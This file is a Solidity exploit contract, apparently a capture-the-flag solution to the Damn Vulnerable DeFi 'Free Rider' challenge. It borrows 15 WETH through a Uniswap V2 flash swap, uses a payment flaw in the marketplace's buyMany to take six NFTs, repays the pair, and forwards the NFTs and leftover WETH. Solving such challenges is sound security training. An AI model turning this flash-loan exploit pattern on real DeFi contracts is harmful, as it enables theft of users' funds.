// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}
        
contract Attacker10 is IUniswapV2Callee, IERC721Receiver {
    address nft;
    address recoveryManager;
    address n_weth;

    event Balance(address owner, uint256 amount);

    function exploit(WETH weth, IUniswapV2Pair pair, FreeRiderNFTMarketplace marketplace, address _nft, address _recoveryManager) external {
        nft = _nft;
        recoveryManager = _recoveryManager;
        n_weth = address(weth);
    
        bytes memory calleeData = abi.encode(
            weth,
            pair,
            marketplace
        );

        emit Balance(address(this), weth.balanceOf(address(this)));
    
        pair.swap(15 ether, 0, address(this), calleeData);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        (WETH weth, IUniswapV2Pair pair, FreeRiderNFTMarketplace marketplace) = abi.decode(data, (WETH, IUniswapV2Pair, FreeRiderNFTMarketplace));
    
        emit Balance(address(this), weth.balanceOf(address(this)));

        weth.withdraw(weth.balanceOf(address(this)));

        uint256[] memory  tokenIds = new uint256[](6);

        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 ether}(tokenIds);

        weth.deposit{value: address(this).balance}();
        weth.transfer(address(pair), 16 ether);

        emit Balance(address(this), weth.balanceOf(address(this)));
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        // DamnValuableNFT(nft).transferFrom(address(this), recoveryManager, tokenId);
        return 0x150b7a02;
    }

    function sendNFT(address player) external {
        bytes memory data = abi.encode(
            player
        );
    
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), recoveryManager, i, data);
        }

        WETH weth = WETH(payable(n_weth));
        weth.transfer(player, weth.balanceOf(address(this)));
    }

    receive() external payable {}
}
